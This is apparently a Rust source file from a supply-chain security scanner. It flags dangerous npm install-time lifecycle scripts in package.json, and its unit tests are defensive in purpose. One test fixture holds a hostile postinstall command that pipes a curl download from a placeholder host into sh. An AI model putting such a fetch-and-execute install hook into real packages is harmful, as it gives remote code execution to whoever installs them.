//! Dangerous npm lifecycle scripts in `package.json`.

use super::util::{dangerous_command_reason, find_line, trim_evidence};
use super::{Check, CheckContext};
use crate::model::{Finding, Severity};
use crate::rule::{Category, Rule, RuleId};
use serde_json::Value as JsonValue;
use std::borrow::Cow;

pub struct PackageJson;

static RULES: &[Rule] = &[Rule {
    id: RuleId::lit("npm-lifecycle-script"),
    title: Cow::Borrowed("Dangerous npm lifecycle script"),
    category: Category::LifecycleScript,
    default_severity: Severity::High,
    rationale: Cow::Borrowed(
        "preinstall/install/postinstall scripts run automatically during \
         `npm install`, the primary supply-chain code-execution vector.",
    ),
}];

impl Check for PackageJson {
    fn rules(&self) -> &'static [Rule] {
        RULES
    }
    fn applies(&self, ctx: &CheckContext) -> bool {
        ctx.file_name() == "package.json"
    }
    fn run(&self, ctx: &CheckContext, out: &mut Vec<Finding>) {
        let path = ctx.path;
        let contents = ctx.contents;
        let Ok(json) = serde_json::from_str::<JsonValue>(contents) else {
            return;
        };
        let Some(scripts) = json.get("scripts").and_then(|value| value.as_object()) else {
            return;
        };

        for script_name in ["preinstall", "install", "postinstall", "prepare"] {
            let Some(command) = scripts.get(script_name).and_then(|value| value.as_str()) else {
                continue;
            };
            if let Some(reason) = dangerous_command_reason(command) {
                out.push(
                    Finding::from_rule("npm-lifecycle-script")
                        .id(format!("npm-script:{script_name}"))
                        .title(format!("Dangerous npm {script_name} script"))
                        .source("Husk package script scanner")
                        .at(path.to_path_buf(), find_line(contents, script_name))
                        .summary(format!(
                            "The {script_name} lifecycle script can execute during dependency installation."
                        ))
                        .evidence(format!("{reason}: {}", trim_evidence(command)))
                        .recommend(
                            "Remove the install-time behavior or pin and review the script before installing this package.",
                        ),
                );
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn run(contents: &str) -> Vec<Finding> {
        let mut out = Vec::new();
        PackageJson.run(
            &CheckContext::new(Path::new("/x/package.json"), contents),
            &mut out,
        );
        out
    }

    #[test]
    fn flags_curl_postinstall() {
        let f = run(r#"{"scripts":{"postinstall":"curl http://x | sh"}}"#);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].category, Category::LifecycleScript);
        assert_eq!(
            f[0].rule_id.as_ref().unwrap().as_str(),
            "npm-lifecycle-script"
        );
    }

    #[test]
    fn ignores_safe_scripts() {
        assert!(run(r#"{"scripts":{"postinstall":"tsc"}}"#).is_empty());
    }
}
